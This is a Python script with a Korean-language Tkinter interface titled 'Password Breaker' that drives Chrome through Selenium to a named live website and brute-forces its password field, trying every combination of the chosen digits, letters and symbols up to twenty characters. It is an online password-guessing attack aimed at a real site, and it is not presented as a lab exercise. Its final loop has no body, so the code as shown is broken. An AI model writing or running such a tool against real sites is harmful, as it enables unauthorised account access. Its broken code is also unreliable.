import platform
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import itertools
import time
from tkinter import *

input_panel, driver = None, None

keys_number = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
keys_lower = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l',
              'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
keys_upper = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L',
              'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
keys_ascii = ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_',
              '=', '+', '`', '~', ',', '<', '.', '>', '/', '?', '\\', '|']

root = Tk()
root.wm_attributes('-toolwindow', 'True')
root.title("Password Breaker")
root.resizable(False, False)

width = root.winfo_screenwidth()
height = root.winfo_screenheight()

root.geometry("400x400+" + str((width - 600)) + '+' + str((height - 400) // 2))

label_pwd = Label(root)
label_pwd['text'] = '비밀번호: \n\n\n'
label_pwd.pack()

label_interval = Label(root)
label_interval['text'] = '반복 간격 시간'
ent_interval = Entry(root)
ent_interval.insert(0, '0.02')

label_interval.pack()
ent_interval.pack()

label_min = Label(root)
label_min['text'] = '비밀번호 최소 길이'
ent_min = Entry(root)
ent_min.insert(0, '1')

label_min.pack()
ent_min.pack()

label_max = Label(root)
label_max['text'] = '비밀번호 최대 길이'
ent_max = Entry(root)
ent_max.insert(0, '20')

label_max.pack()
ent_max.pack()

label_include = Label(root)
label_include['text'] = '포함할 문자 형식'

label_include.pack()

check_num_val = IntVar()
check_lower_val = IntVar()
check_upper_val = IntVar()
check_ascii_val = IntVar()

check_num = Checkbutton(root, text='숫자', variable=check_num_val)
check_lower = Checkbutton(root, text='소문자', variable=check_lower_val)
check_upper = Checkbutton(root, text='대문자', variable=check_upper_val)
check_ascii = Checkbutton(root, text='특수문자', variable=check_ascii_val)

check_num.select()
check_lower.select()

check_num.pack()
check_lower.pack()
check_upper.pack()
check_ascii.pack()


def init():
    global input_panel, driver

    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
    url = "https://www.evolauto.com/"
    driver.get(url)

    xpath_input = '//*[@id="password"]'

    input_panel = driver.find_element(by=By.XPATH, value=xpath_input)

    start()


def start():
    global input_panel
    keys = []

    if check_num_val.get() == 1:
        keys += keys_number
    if check_lower_val.get() == 1:
        keys += keys_lower
    if check_upper_val.get() == 1:
        keys += keys_upper
    if check_ascii_val.get() == 1:
        keys += keys_ascii

    for r in range(int(ent_min.get()), int(ent_max.get()) + 1):
        for i in itertools.product(keys, repeat=r):
            password = ''.join(i)
            label_pwd['text'] = '비밀번호: ' + password + '\n\n\n'
            root.update()
            input_panel.clear()
            input_panel.send_keys(password)
            input_panel.send_keys(Keys.ENTER)
            time.sleep(float(ent_interval.get()))
            while driver.switch_to.alert.accept():

button_confirm = Button(root, text='시작', command=init)
button_confirm.pack()

root.mainloop()
